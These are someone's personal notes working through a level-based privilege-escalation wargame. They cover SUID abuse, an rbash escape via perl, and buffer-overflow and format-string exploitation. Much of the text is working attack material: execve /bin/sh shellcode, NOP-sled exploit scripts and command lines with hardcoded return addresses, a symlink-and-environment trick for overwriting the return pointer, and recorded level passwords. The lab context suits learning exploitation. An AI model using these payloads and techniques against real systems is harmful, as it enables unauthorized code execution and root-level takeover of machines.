IMPORTANT FOR ALL BUFFER OVERFLOW ATTACKS:
it's better to test exploits using the raw executable rather than via gdb because the offsets will change
however, in order to debug the offsets, you need to examine the core dumps
to ensure a core dump
execute from a writable directory
the executable needs to be also in that directory
otherwise the core doesn't get dumped


-=Level 3=-
The hint in the MOTD suggested that there is a rogue suid executable somewhere.
Used find to locate suid executables belonging to level3
/usr/bin/false
when running false in gdb, you can see that the arguments to false are getting passed directly to a call to sash, so:
/usr/bin/false -c "id"  -----> shows euid = level3

run /usr/bin/false -c "more /pass/level3" will show the password

point of confusion: running false normally, it immediately returns with a value of 1, even if there are arguments.  however, when running it with gdb makes it open with a sash shell prompt.  What about running it with gdb causes the shell prompt to be interactive?  Actually, with testing, I've noticed that running false in any way outside the command line causes the prompt to be called
eg:
false ---> no prompt
gdb /usr/bin/false  ---> prompt
sh /usr/bin/false ---> prompt
echo /usr/bin/false ---> prompt


Important quesion about suid:
If you exec a new program from within a suid executable, does the new program also inherit the suid execution bit? or does it only inherit the euid?

pass:l3thal_Rul3Z!






-=Level3=-
Break out of the rbash environment
rbash is essentially a bash environemnt with limited capabilities (on the bash end)
rbash isn't secure because many programs that you would want to offer the user would grant them abilities that would allow them to escape
ie.
change environment variables
acccess another shell (ie. vim !)

In this case, we escape because we have access to perl, which allows us to run scripts on the fly
in a perl script we execute;
system ("/bin/sh");
which gives us a shell
We still have the same execution environment, but one key restriction is overcome: we now can use / in our commands
we use the find command to search for a suid executable
running that executable gives us the new password

pass: n3xt_l3v3l!



-=level4=-
Normal stack overflow problem

pass: yummy_bluntz


-=level5=-
another buffer overflow

Aleph One shellcode (directly spawn a shell with execve)
length:45
\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh


can't figure out what's going on here
export VULN=`perl -e 'print "\x90"x1012 . "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" . "\xee\xd3\xff\xbf"'`

better method for memory mapping

print '\x41' * 8 + ''.join(['\x41' * 7 + chr(x) for x in xrange(1,0xff)])
('\x41' * 8 + ''.join(['\x41\x42\x43\x44\x45\x46\x47' + chr(x) for x in xrange(1,0xff)])a


start of shellcode -> 0xbfffcc80
0x80 * 8 - 0x3 -> next is return address

#
#	exploit script
#
alleysize = 0x80 * 8 + 12
shellcode = '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh'
addr = '\xbf\xff\xd1\x01'[::-1]
payload = '\x90' * (alleysize - len(shellcode)) + shellcode + addr
print payload

pass: ur_so_l33t



-=level6=-

#for exploring memory
./test6 `python -c "import re; s = '\x90'*(2048-45) + '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh' + '\x41' + ''.join([chr(x) for x in xrange(1, 0xff)]); s = re.sub('\s', 'a', s); print s;"` `python -c "print 'a' * 1023"`

#the exploit
./level6 `python -c "import re; s = '\x90'*(2048-45) + '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh' + '\x69' * 0xc + '\xbf\xff\xc5\x41'[::-1]; print s;"` `python -c "print 'a' * 1023"`

pass: g00d_j0b



-=level7=-
The trick to write shelcode that doesn't have certain bytes

xor eax, eax   --->   0x33 0xC0



./test7 `python -c "print '\x33\xc0'*5 + '\x99\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80' + 'a'* 100"

22 bytes execve /bin/sh
\x99\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80

~0x940 bytes between $fp of main and beginning of NOP slide in environment variables
up to 59 characters before segfault

Solution:  put the nops and shellcode in environment variable.  To overwrite return pointer, craft a specially-named sym link that allows you to control the contents of argv[0].  However, because 0xff is disallowed in the buffer, you need to make the environment variables large enough (~0xffff) to cause the frame pointer to shift down enough that the digits don't have 0xff.  

ln -s /levels/level7 `python -c "print 'a'*58 + '\x48\xe2\xfe\xbf'"`
export LEET=`python -c "print '\x90'*0xffff + '\x99\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80'"`

pass: w3ll_d0n3!


-=Level8=-
example of running gcc to allow for format strings:
gcc printf.c -w -O0 -ggdb -std=c99 -static -D_FORTIFY_ SOURCE=0 -fno-pie -Wno-format -Wno-format-security -fno-stack-protector -z norelro -z execstack -o printf
gcc level8.c -w -O0 -ggdb -std=c99 -static -D_FORTIFY_ SOURCE=0 -fno-pie -Wno-format -Wno-format-security -fno-stack-protector -z norelro -z execstack -o level8 
^i'm not sure that these work




stack notes:
	parameters are pushed onto the stack in the order that they are mentioned in the method

format string notes:
	at least in my local build, %hhn will pop a word off the stack, but will interpret it as a halfhalf word
	
	YOU WERE MISUNDERSTANDING THE PRINTF FORMAT STRING ATTACK:
	%n causes the number of characters written to the output buffer to be written to the address specified by the pointer

	steps of printf exploit:
		1. injection of an address (&addr) in a higher memory location than the printf call
		2. use calculated calls to %x to make the printf argument pointer to point to your injected address (&addr)
		3. at the same time, be sure to write a specific number of characters to the buffer, corresponding to the value you want to write (val)
		4. use %n to write val to the address pointed to by &addr

	To write a full word to memory:
		do the above steps four times


	%x increases the printf argument pointer by a word


ulimit -c unlimited 		#run this in your bash to ensure core dumps after segmentation faults

to speed up searching through memory:
gdb -batch -c core.32267 -x dumpmemory.gdb; hexdump -C memory

the dumpmemory.gdb file should contain:
dump memory ./memory 0xbfff0000 0xbfffe100


hexdump gotcha: calling hexdump without modifiers will wonk up the byte orders.  It appears that the default settings cause it to display as if the binary were 2 byte words in little endian so your byte stream will be out of expected order.  Instead, call with "hexdump -C", which shows the true ordering of the bytes (meaning you have to understand little endian order in your head).



./level8 aoeu aoeu `python exploit8.py 0x7 0xbfffdaa0 0x30405060`
^doesn't actually work, but good starting point


